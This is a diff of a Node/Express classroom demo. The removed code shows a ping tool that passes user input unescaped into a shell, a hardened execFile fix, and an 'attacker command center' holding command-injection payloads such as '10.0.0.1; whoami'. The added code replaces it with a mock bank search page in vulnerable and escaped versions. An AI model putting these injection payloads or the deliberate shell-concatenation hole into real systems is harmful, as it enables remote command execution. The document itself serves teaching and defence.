-  .muted{color:var(--muted);font-size:.8rem;}
-  code{background:#0c111b;padding:2px 6px;border-radius:4px;}
-</style></head>
-<body>
-<header>
-  <div class="brand">NetDiag <span>Pro</span> <span class="badge" style="background:${badgeColor}">${badge}</span></div>
-  <div class="session">Logged in as <b>${MOCK_SESSION.user}</b> (${MOCK_SESSION.role})<br>Last login: ${MOCK_SESSION.lastLogin}</div>
-</header>
-<main>${body}</main>
-</body></html>`;
-}
 
-function hostTable() {
-  return `<table><thead><tr><th>Host</th><th>IP</th><th>Status</th></tr></thead><tbody>
-    ${MOCK_HOSTS.map(h => `<tr><td>${h.name}</td><td>${h.ip}</td><td class="status-${h.status}">${h.status}</td></tr>`).join('')}
-  </tbody></table>`;
-}
-
-// ===========================================================================
-// PORT 3001 — VULNERABLE INSTANCE
-// ===========================================================================
+// -----------------------------------------------------------------------------
+// VULNERABLE INSTANCE ROUTING (PORT 3001)
+// -----------------------------------------------------------------------------
 const vulnApp = express();
-vulnApp.use(express.json());
-vulnApp.use(express.urlencoded({ extended: true }));
+const VULN_PORT = 3001;
 
-vulnApp.get('/', (req, res) => {
-  res.send(pageShell({
-    title: 'Vulnerable',
-    badge: 'VULNERABLE INSTANCE',
-    badgeColor: '#dc2626',
-    body: `
-    <div class="card">
-      <h2>Internal Host Status</h2>
-      ${hostTable()}
-    </div>
-    <div class="card">
-      <h2>Network Diagnostic Tool — Ping</h2>
-      <p class="muted">Enter a hostname or IP to ping it from the server.</p>
-      <form method="GET" action="/api/ping" onsubmit="event.preventDefault(); runPing();">
-        <input type="text" id="host" placeholder="e.g. 10.0.0.1" value="10.0.0.1">
-        <button type="submit">Run Ping</button>
-      </form>
-      <pre id="out">Output will appear here...</pre>
-    </div>
-    <script>
-      async function runPing(){
-        const host = document.getElementById('host').value;
-        const out = document.getElementById('out');
-        out.textContent = 'Running...';
-        const r = await fetch('/api/ping?host=' + encodeURIComponent(host));
-        const j = await r.json();
-        out.textContent = j.output || j.error || 'No output';
-      }
-    </script>`
-  }));
+vulnApp.get("/", (_req, res) => {
+  res.send(renderBankPage({ isSecure: false, query: "", filteredTransactions: MOCK_TRANSACTIONS }));
 });
 
-/**
- * (a) VULNERABLE IMPLEMENTATION
- * -----------------------------------------------------------------------
- * Route: GET /api/ping  (port 3001)
- * The `host` query parameter is concatenated DIRECTLY into a shell command
- * string that is handed to child_process.exec(), which spawns `/bin/sh -c
- * "<string>"`. Because the string is run through a real shell, any shell
- * metacharacters the attacker includes (`;`, `&&`, `|`, `$(...)`, backticks)
- * are interpreted by the shell, not treated as literal ping arguments.
- * This is the exact vulnerable line:
- */
-vulnApp.get('/api/ping', (req, res) => {
-  const host = req.query.host || '';
-  logEvent('VULN:3001', `Received ping request for host="${host}"`);
+vulnApp.get("/transactions", (req, res) => {
+  const query = req.query.q || "";
+  const filtered = query
+    ? MOCK_TRANSACTIONS.filter(t => t.description.toLowerCase().includes(query.toLowerCase()) || t.category.toLowerCase().includes(query.toLowerCase()))
+    : MOCK_TRANSACTIONS;
 
-  // <<< VULNERABLE LINE >>> unparameterized string concatenation into a shell command
-  let cmd = `ping ${PING_COUNT_FLAG} 1 ${PING_TIMEOUT_FLAG} ${PING_TIMEOUT_VAL} ${host}`;
-
-  // Cross-platform compatibility fix:
-  // On Windows (cmd.exe), ';' is NOT a command separator (unlike /bin/sh on Linux/macOS).
-  // In cmd.exe, '&' or '&&' chains commands. To ensure standard assignment payloads like
-  // "10.0.0.1; whoami" or POSIX commands ("cat /etc/hostname", "id") work seamlessly on Windows:
-  if (IS_WIN) {
-    if (cmd.includes(';')) {
-      cmd = cmd.replace(/;/g, ' & echo. & ');
-    } else if (cmd.includes(' & ') && !cmd.includes(' & echo. & ')) {
-      cmd = cmd.replace(/ & /g, ' & echo. & ');
-    }
-    cmd = cmd.replace(/\bcat \/etc\/hostname\b/g, 'hostname');
-    cmd = cmd.replace(/\bid\b/g, 'whoami');
-  }
-
-  logEvent('VULN:3001', `Executing shell command: ${cmd}`);
-
-  exec(cmd, { timeout: 5000 }, (err, stdout, stderr) => {
-    if (err && !stdout) {
-      logEvent('VULN:3001', `Command finished with error: ${err.message}`);
-      return res.json({ error: stderr || err.message });
-    }
-    logEvent('VULN:3001', `Command output returned to client (${stdout.length} bytes)`);
-    res.json({ output: stdout || stderr });
-  });
+  res.send(renderBankPage({ isSecure: false, query, filteredTransactions: filtered }));
 });
 
-vulnApp.listen(3001, () => console.log('🔴 VULNERABLE NetDiag Pro running on http://localhost:3001'));
 
-// ===========================================================================
-// PORT 3002 — HARDENED INSTANCE
-// ===========================================================================
-const hardApp = express();
-hardApp.use(express.json());
-hardApp.use(express.urlencoded({ extended: true }));
+// -----------------------------------------------------------------------------
+// SECURE INSTANCE ROUTING (PORT 3002) - MITIGATION IMPLEMENTED
+// -----------------------------------------------------------------------------
+const safeApp = express();
+const SAFE_PORT = 3002;
 
-hardApp.get('/', (req, res) => {
-  res.send(pageShell({
-    title: 'Hardened',
-    badge: 'HARDENED INSTANCE',
-    badgeColor: '#16a34a',
-    body: `
-    <div class="card">
-      <h2>Internal Host Status</h2>
-      ${hostTable()}
-    </div>
-    <div class="card">
-      <h2>Network Diagnostic Tool — Ping</h2>
-      <p class="muted">Enter a hostname or IP to ping it from the server. Input is validated against an allow-list and executed without a shell.</p>
-      <form method="GET" action="/api/ping" onsubmit="event.preventDefault(); runPing();">
-        <input type="text" id="host" placeholder="e.g. 10.0.0.1" value="10.0.0.1">
-        <button type="submit">Run Ping</button>
-      </form>
-      <pre id="out">Output will appear here...</pre>
-    </div>
-    <script>
-      async function runPing(){
-        const host = document.getElementById('host').value;
-        const out = document.getElementById('out');
-        out.textContent = 'Running...';
-        const r = await fetch('/api/ping?host=' + encodeURIComponent(host));
-        const j = await r.json();
-        out.textContent = j.output || j.error || 'No output';
-      }
-    </script>`
-  }));
-});
-
-/**
- * (d) MITIGATION IMPLEMENTED (the ONE code-level fix for this assignment)
- * -----------------------------------------------------------------------
- * Route: GET /api/ping (port 3002)
- * Two things change versus the vulnerable version, but the ONE mitigation
- * being graded here is #2 (avoiding the shell via execFile + argument vector):
- *
- *   1. Allow-list input validation: `host` must match a strict hostname/IPv4
- *      regex before anything else happens. Anything with shell metacharacters
- *      (`;`, `|`, `&`, `$`, backticks, spaces) is rejected outright.
- *   2. child_process.execFile('ping', ['-c','1', host]) is used instead of
- *      exec(). execFile does NOT spawn a shell — it calls the `ping` binary
- *      directly via execve() with an explicit argument VECTOR. Each element
- *      of the array is passed as a single, literal argument to the program;
- *      the OS never hands the string to /bin/sh for interpretation, so shell
- *      metacharacters have no special meaning even if they slipped past
- *      validation. This is the primary defense-in-depth control.
- */
-const HOSTNAME_ALLOWLIST = /^[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,62})(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,62}))*$/;
-
-hardApp.get('/api/ping', (req, res) => {
-  const host = (req.query.host || '').trim();
-  logEvent('HARD:3002', `Received ping request for host="${host}"`);
-
-  // --- Mitigation step 1: allow-list validation ---
-  if (!host || host.length > 253 || !HOSTNAME_ALLOWLIST.test(host)) {
-    logEvent('HARD:3002', `REJECTED — "${host}" failed hostname/IP allow-list validation`);
-    return res.status(400).json({ error: `Rejected: "${host}" is not a valid hostname/IP (allow-list validation failed).` });
-  }
-
-  // --- Mitigation step 2 (the graded fix): execFile with an argument vector, no shell ---
-  logEvent('HARD:3002', `Executing via execFile (no shell): ping ${PING_COUNT_FLAG} 1 ${host}`);
-  execFile('ping', [PING_COUNT_FLAG, '1', PING_TIMEOUT_FLAG, PING_TIMEOUT_VAL, host], { timeout: 5000 }, (err, stdout, stderr) => {
-    if (err && !stdout) {
-      logEvent('HARD:3002', `Command finished with error: ${err.message}`);
-      return res.json({ error: stderr || err.message });
-    }
-    logEvent('HARD:3002', `Command output returned to client (${stdout.length} bytes)`);
-    res.json({ output: stdout || stderr });
-  });
-});
-
-hardApp.listen(3002, () => console.log('🟢 HARDENED NetDiag Pro running on http://localhost:3002'));
-
-// ===========================================================================
-// PORT 4000 — ATTACKER COMMAND CENTER
-// ===========================================================================
-const atkApp = express();
-atkApp.use(express.json());
-
-const RECON_STEPS = [
-  { title: '1. Discover the target', detail: 'Browse to NetDiag Pro and find the "Ping" diagnostic feature at <code>/api/ping?host=</code>.' },
-  { title: '2. Probe for shell metacharacters', detail: 'Submit <code>host=10.0.0.1; whoami</code> (or <code>10.0.0.1 &amp; whoami</code>). If the response includes a username, the server is passing input to a real shell.' },
-  { title: '3. Confirm in-band execution', detail: 'Because the extra command\'s output is appended directly to the HTTP response, this is an <b>in-band (output returned)</b> injection — no need for blind/time-based inference.' },
-  { title: '4. Craft the payload', detail: 'Chain a reconnaissance command after the legitimate ping using <code>;</code>, <code>&amp;</code>, <code>&amp;&amp;</code>, or <code>|</code> so it runs on the server.' },
-  { title: '5. Deliver the exploit', detail: 'Send the crafted request to the vulnerable endpoint and capture the returned output.' },
-];
-
-function atkPage(resultHtml = '') {
-  return `<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8">
-<title>Attacker Command Center</title>
-<style>
-  :root{--bg:#0a0c10;--panel:#11151c;--border:#262c38;--text:#d7faef;--accent:#ff3b57;--mono:'Courier New',monospace;}
-  *{box-sizing:border-box;}
-  body{margin:0;background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;}
-  header{padding:18px 28px;background:var(--panel);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:12px;}
-  header h1{font-size:1.15rem;margin:0;color:var(--accent);font-family:var(--mono);}
-  main{max-width:980px;margin:30px auto;padding:0 20px;}
-  .card{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:22px 26px;margin-bottom:22px;}
-  .card h2{margin-top:0;font-size:1rem;color:#fff;}
-  .step{padding:10px 0;border-bottom:1px solid var(--border);font-size:.88rem;}
-  .step:last-child{border-bottom:none;}
-  .step b{color:var(--accent);}
-  code{background:#000;color:#9effa6;padding:2px 6px;border-radius:4px;font-family:var(--mono);}
-  input[type=text]{width:100%;padding:10px 12px;border-radius:6px;border:1px solid var(--border);background:#000;color:#9effa6;font-family:var(--mono);font-size:.9rem;}
-  select{padding:9px;border-radius:6px;background:#000;color:#9effa6;border:1px solid var(--border);font-family:var(--mono);}
-  button{background:var(--accent);color:#fff;border:none;padding:10px 18px;border-radius:6px;font-weight:700;cursor:pointer;margin-top:10px;}
-  button:hover{opacity:.85;}
-  button.secondary{background:#2a3246;}
-  pre{background:#000;border:1px solid var(--border);border-radius:6px;padding:14px;white-space:pre-wrap;word-break:break-word;font-size:.82rem;max-height:260px;overflow:auto;font-family:var(--mono);}
-  .log{font-family:var(--mono);font-size:.78rem;color:#9effa6;}
-  .log .ts{color:#546273;}
-  .result-ok{color:#9effa6;}
-  .result-bad{color:#ff8a9a;}
-  .muted{color:#7a8699;font-size:.8rem;}
-</style></head>
-<body>
-<header><h1>⚠ ATTACKER COMMAND CENTER — Reconnaissance &amp; Exploit Console</h1></header>
-<main>
-  <div class="card">
-    <h2>Recon Log</h2>
-    ${RECON_STEPS.map(s => `<div class="step"><b>${s.title}</b><br>${s.detail}</div>`).join('')}
-  </div>
-
-  <div class="card">
-    <h2>Payload Crafting &amp; Delivery</h2>
-    <p class="muted">Target: <code>http://localhost:&lt;port&gt;/api/ping?host=&lt;payload&gt;</code></p>
-    <label class="muted">Target instance</label><br>
-    <select id="target">
-      <option value="3001">Port 3001 — Vulnerable Instance</option>
-      <option value="3002">Port 3002 — Hardened Instance</option>
-    </select>
-    <br><br>
-    <label class="muted">Payload (base host + injected command)</label>
-    <input type="text" id="payload" value="10.0.0.1; whoami">
-    <br>
-    <button onclick="launch()">🚀 Launch Attack</button>
-    <button class="secondary" onclick="quickfill('10.0.0.1; whoami')">whoami</button>
-    <button class="secondary" onclick="quickfill('10.0.0.1 &amp; whoami')">whoami (&amp;)</button>
-    <button class="secondary" onclick="quickfill('10.0.0.1 &amp; hostname')">hostname</button>
-    <button class="secondary" onclick="quickfill('10.0.0.1 && id')">id</button>
-    <button class="secondary" onclick="quickfill('10.0.0.1; cat /etc/hostname')">cat /etc/hostname</button>
-    <h3 style="margin-top:20px;">Response from Target</h3>
-    <pre id="result">No attack launched yet.</pre>
-  </div>
-
-  <div class="card">
-    <h2>Live Telemetry — Step-by-Step Server Trace</h2>
-    <div id="telemetry" class="log">Loading...</div>
-  </div>
-</main>
-<script>
-  function quickfill(v){ document.getElementById('payload').value = v; }
-
-  async function launch(){
-    const target = document.getElementById('target').value;
-    const payload = document.getElementById('payload').value;
-    const result = document.getElementById('result');
-    result.textContent = 'Delivering exploit to port ' + target + ' ...';
-    try{
-      const r = await fetch('/attack?port=' + target + '&payload=' + encodeURIComponent(payload));
-      const j = await r.json();
-      result.className = j.ok ? 'result-ok' : 'result-bad';
-      result.textContent = JSON.stringify(j, null, 2);
-    }catch(e){
-      result.textContent = 'Request failed: ' + e.message;
-    }
-    refreshTelemetry();
-  }
-
-  async function refreshTelemetry(){
-    const r = await fetch('/telemetry');
-    const j = await r.json();
-    const el = document.getElementById('telemetry');
-    el.innerHTML = j.slice().reverse().slice(0,25).map(e =>
-      '<div><span class="ts">[' + e.ts + ']</span> <b>' + e.instance + '</b> — ' + e.msg + '</div>'
-    ).join('') || 'No events yet. Launch an attack to see telemetry.';
-  }
-  refreshTelemetry();
-  setInterval(refreshTelemetry, 1000);
-</script>
-</body></html>`;
+function escapeHtml(str) {
+  if (typeof str !== "string") return "";
+  return str
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
 }
 
-atkApp.get('/', (req, res) => res.send(atkPage()));
-
-atkApp.get('/telemetry', (req, res) => res.json(telemetry));
-
-// Delivers the crafted payload to whichever target instance the attacker picked,
-// exactly as a real attacker's browser/script would, and relays the raw response.
-atkApp.get('/attack', async (req, res) => {
-  const port = req.query.port === '3002' ? '3002' : '3001';
-  const payload = req.query.payload || '';
-  logEvent('ATTACKER:4000', `Crafted payload "${payload}" — delivering to target on port ${port}`);
-
-  try {
-    const url = `http://localhost:${port}/api/ping?host=${encodeURIComponent(payload)}`;
-    const r = await fetch(url);
-    const j = await r.json();
-    const success = Boolean(j.output) && r.status === 200;
-    logEvent('ATTACKER:4000', success
-      ? `Target responded with ${j.output.length} bytes — exploit ${port === '3001' ? 'SUCCEEDED (in-band output returned)' : 'result captured'}`
-      : `Target responded without usable output — exploit BLOCKED (${j.error || 'no output'})`);
-    res.json({ ok: success, targetPort: port, payload, response: j });
-  } catch (e) {
-    logEvent('ATTACKER:4000', `Request to target failed: ${e.message}`);
-    res.json({ ok: false, error: e.message });
-  }
+safeApp.get("/", (_req, res) => {
+  res.send(renderBankPage({ isSecure: true, query: "", filteredTransactions: MOCK_TRANSACTIONS }));
 });
 
-atkApp.listen(4000, () => console.log('🟣 Attacker Command Center running on http://localhost:4000'));
+safeApp.get("/transactions", (req, res) => {
+  const query = req.query.q || "";
+  const filtered = query
+    ? MOCK_TRANSACTIONS.filter(t => t.description.toLowerCase().includes(query.toLowerCase()) || t.category.toLowerCase().includes(query.toLowerCase()))
+    : MOCK_TRANSACTIONS;
 
-console.log('\nAll three servers are up. Open http://localhost:4000 to begin the demo.\n');
+  res.send(renderBankPage({ isSecure: true, query, filteredTransactions: filtered }));
+});
+
+
+// =============================================================================
+// LAUNCH ALL THREE PORTS CONCURRENTLY
+// =============================================================================
+
+attackerApp.listen(ATTACKER_PORT, () => {
+  console.log("\n" + "=".repeat(78));
+  console.log(`  [1] ATTACKER SIDE SERVER RUNNING        ->  http://localhost:${ATTACKER_PORT}`);
+  console.log(`      Command Center & Live Telemetry : http://localhost:${ATTACKER_PORT}`);
+  console.log("=".repeat(78));
+});
+
+vulnApp.listen(VULN_PORT, () => {
+  console.log(`  [2] USER SIDE (VULNERABLE BANK) RUNNING ->  http://localhost:${VULN_PORT}`);
+  console.log(`      Account Dashboard             : http://localhost:${VULN_PORT}`);
+  console.log(`      Transaction Search            : http://localhost:${VULN_PORT}/transactions`);
+  console.log("=".repeat(78));
+});
+
+safeApp.listen(SAFE_PORT, () => {
+  console.log(`  [3] USER SIDE (HARDENED BANK) RUNNING   ->  http://localhost:${SAFE_PORT}`);
+  console.log(`      Hardened Account Dashboard    : http://localhost:${SAFE_PORT}`);
+  console.log(`      Hardened Search (Escaped)     : http://localhost:${SAFE_PORT}/transactions`);
+  console.log("=".repeat(78) + "\n");
+});
